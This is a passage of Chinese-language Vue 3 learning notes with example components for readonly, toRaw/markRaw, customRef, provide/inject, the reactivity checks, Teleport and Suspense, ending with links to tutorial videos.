  <button @click="age++">增长年龄</button>
  <button @click="job.j1.salary++">增长薪资</button>
</template>

<script>
import {ref,reactive, toRefs, readonly, shallowReadonly} from 'vue';
export default {
  name: 'Demo',
  setup(){

    let sum = ref(0);

    let person = reactive({
      name: '张三',
      age: 18,
      job:{
        j1:{
          salary: 20
        }
      }
    });

    // person = readonly(person); //此时person里面的属性值都不允许修改
    //person = shallowReadonly(person); //第一层不能改(name,age), 但j1和salary仍然可以改动

    // sum = readonly(sum); //同理
    // sum = shallowReadonly(sum)

    return {
      sum,
      ...toRefs(person),
    };

  }
}
</script>

<style>
</style>

```

---

### toRaw

文件结构

![image](A85A845595494BF087E5AA8926033AF9)

改动 

Demo.vue

```
<template>
  <h2>当前求和为:{{ sum }}</h2>
  <button @click="sum++">sum+1</button>
  <hr/>
  <h2>姓名:{{ name }}</h2>
  <h2>年龄:{{ age }}</h2>
  <h2>薪资:{{ job.j1.salary }}K</h2>
  <h3 v-show="person.car">座驾信息:{{ person.car }}</h3>
  <button @click="name = name + '~'">修改姓名</button>
  <button @click="age++">增长年龄</button>
  <button @click="job.j1.salary++">增长薪资</button>
  <button @click="showRawPerson">输出最原始的person</button>
  <button @click="addCar">给人添加一台车</button>
  <button @click="person.car && (person.car.name +='!') ">换车名</button>
  <button @click="changePrice">换价格</button>
</template>

<script>
import {markRaw, reactive, ref, toRaw, toRefs} from 'vue';

export default {
  name: 'Demo',
  setup(){

    let sum = ref(0);

    let person = reactive({
      name: '张三',
      age: 18,
      job:{
        j1:{
          salary: 20
        }
      }
    });

    //ref reactive(响应式)

    const showRawPerson = () => {
       const  p = toRaw(person);
       // console.log(person); //proxy代理对象 Proxy {....}
       p.age++; //注意此时页面不会再发生变化了,普普通通的对象不是响应式
       console.log(p); //原始对象数据  {....}

      // const sum  = toRaw(sum);
      // console.log(sum); //undefined //这条路走不通,toRaw只处理reactive对象
    }

    const addCar = () => {
      person.car = markRaw({
         name: 'benz',
         price: 40
       }); //在响应式的对象身上添加任何属性都是响应式的，经过markRaw一包装就变成最原始的数据就不会再做响应
    }


    const changePrice = () => {
      person.car?.price && person.car.price++;
      console.log(person?.car?.price);
    }

    return {
      sum,
      person,
      ...toRefs(person),
      showRawPerson,
      addCar,
      changePrice
    };

  }
}
</script>

<style>
</style>
```

---

### customRef

文件结构

![image](C99DF230A58A458389280FA9B5987A54)

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <input v-model="keyWord"/>
  <h3>{{ keyWord }}</h3>
</template>

<script>
import { ref, customRef} from 'vue';
export default {
  name: 'App',
  setup(){
    // let keyWord = ref('hello'); //使用vue提供的内置ref,
    let keyWord = myRef('hello'); //使用自定义ref

    //自定义ref(customRef)
    function myRef(value){
      return customRef((track, trigger) => {
         let timer;
         return {
           get(){
              console.log(`从myRef这个容器读取数据,data:${value}`);
              track(); //通知追踪value的变化(跟getter商量一下让它明确你这个value是有用的)
              return value; //读取的时候就会调用get
           },
           set(nv){
             console.log(`myRef容器中的数据被修改,data改为${nv}`);
             clearTimeout(timer);
             timer = setTimeout(() => {
               value = nv;
               trigger(); //trigger通知vue重新解析模版 //防抖
             },500);
           }
         }
      });
    }

    return {
      keyWord,
    }
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

---

### provide与inject

文件结构

![image](9F5D49416B85448F97C019645BBC8A7D)

App.vue
```
<template>
  <div class="app">
    <h2>app(祖) {{ name }}---{{ price }}</h2>
    <Child/>
  </div>
</template>

<script>
import Child from "./components/Child";
import {reactive, toRefs, provide} from "vue";
export default {
  name: 'App',
  components: {Child},
  setup(){
    let car = reactive({
      name: 'benz',
      price: 40
    });
    provide('car', car); //给自己的后代组件递数据 后代都可以
    return {
      ...toRefs(car)
    }
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
.app{
  background: grey;
  padding: 10px;
}
</style>
```

Child.vue
```
<template>
  <div class="child">
    <h2>child(子)</h2>
    <Son/>
  </div>
</template>

<script>
import Son from "./Son";
import { inject } from "vue";

export default {
  name: "Child",
  components: {Son},
  setup() {
    console.log('@@@@ Car ', inject('car'))
  }
}
</script>

<style scoped>
   .child{
     background: skyblue;
     padding: 10px;
   }
</style>
```

Son.vue
```
<template>
  <div class="son">
    <h2>son(孙)</h2>
    <h3>从app组件获取的数据:{{ car.name }} --- {{ car.price }}</h3>
  </div>
</template>

<script>
import { inject } from "vue";
export default {
  name: "Son",
  setup(){
    let car = inject('car'); //获取数据
    console.log(car); //响应式数据
    return {
      car
    }
  }
}
</script>

<style scoped>
  .son{
    background: orange;
    padding: 10px;
  }
</style>
```

---

### 响应式数据判断

文件结构

![image](4066F58F2FDA4586B7F0ABD5ECAA4625)

改动

App.vue

```
<template>
  <div class="app">
  </div>
</template>

<script>
import {reactive, readonly, ref, toRefs, isRef, isReactive, isReadonly, isProxy} from "vue";
export default {
  name: 'App',
  setup(){

    let car = reactive({
      name: '宝马',
      price: 40
    });

    let sum = ref(0);

    let car2 = readonly(car); ///readonly依然返回代理类型的对象只不过它不能再改而已

    console.log(isRef(sum), isReactive(car), isReadonly(car2), isProxy(car), isProxy(car2), isProxy(sum));

  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
.app{
  background: grey;
  padding: 10px;
}
</style>
```

---

### Teleport组件

文件结构

![image](666F7F0877594699A1B86ECFA4B6D325)

main.js
```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');
```

App.vue
```
<template>
  <div class="app">
    <h2>app</h2>
    <Child/>
  </div>
</template>

<script>
import Child from "./components/Child";
import {reactive, toRefs, provide} from "vue";
export default {
  name: 'App',
  components: {Child},
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
.app{
  background: grey;
  padding: 10px;
}
</style>
```

Child.vue
```
<template>
  <div class="child">
    <h2>child(子)</h2>
    <Son/>
  </div>
</template>

<script>
import Son from "./Son";
export default {
  name: "Child",
  components: {Son},
  setup() {
    // console.log('@@@@ Car ', inject('car'))
  }
}
</script>

<style scoped>
   .child{
     background: skyblue;
     padding: 10px;
   }
</style>
```

Son.vue
```
<template>
  <div class="son">
    <h2>son(孙)</h2>
    <Dialog/>
  </div>
</template>

<script>
import Dialog from "./Dialog";
export default {
  name: "Son",
  components: {Dialog}
}
</script>

<style scoped>
  .son{
    background: orange;
    padding: 10px;
  }
</style>
```

Dialog.vue
```
<template>
  <div>
    <button @click="isShow = true">点我弹个窗</button>
    <teleport to="body">
      <div class="mask" v-if="isShow">
        <div class="dialog">
          <h3>我是一个弹窗</h3>
          <h4>一些内容</h4>
          <h4>一些内容</h4>
          <h4>一些内容</h4>
          <h4>一些内容</h4>
          <button @click="isShow = false">关闭弹窗</button>
        </div>
      </div>
    </teleport>
  </div>
</template>

<script>
import { ref } from "vue";
export default {
  name: "Dialog",
  setup(){
    let isShow = ref(false);
    return {
      isShow
    }
  }
}
</script>

<style scoped>
  .mask{
    position: absolute;
    top:0;
    bottom: 0;
    left: 0;
    right:0;
    background: rgba(0,0,0,.5);
    text-align: center;
  }
  .dialog{
    position: absolute;
    top: 50%;
    left:50%;
    transform: translate(-50%, -50%);
    width: 300px;
    height: 300px;
    background: #42b983;
  }
</style>
```

---

### suspend组件

文件结构

![image](46AAE69D341C4B0C92DE270B6E5F6CF5)

main.js
```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');
```

App.vue
```
<template>
  <div class="app">
    <h2>app</h2>
    <Suspense>
      <template v-slot:default>
        <Child/>
      </template>
      <template v-slot:fallback>
        <!--退路-->
        <h3>loading...</h3>
      </template>
    </Suspense>
  </div>
</template>

<script>
import { defineAsyncComponent } from "vue";
const Child = defineAsyncComponent(() => import('./components/Child')); //动态引入组件(异步)
export default {
  name: 'App',
  components: {Child},
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
.app{
  background: grey;
  padding: 10px;
}
</style>
```

Child.vue
```
<template>
  <div class="child">
    <h2>child(子)</h2>
    {{ sum }}
  </div>
</template>

<script>
import { ref } from 'vue';
export default {
  name: "Child",
  async setup() {
    let sum = ref(0);

    let p = new Promise((resolve, reject) => {
      setTimeout(() => {
        resolve({
          sum
        });
      },5000)
    })

    return await p;
  }
}
</script>

<style scoped>
   .child{
     background: skyblue;
     padding: 10px;
   }
</style>
```

---

### composition API

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=164

---

### Fragment组件

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=165

---

### hook

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=156

---

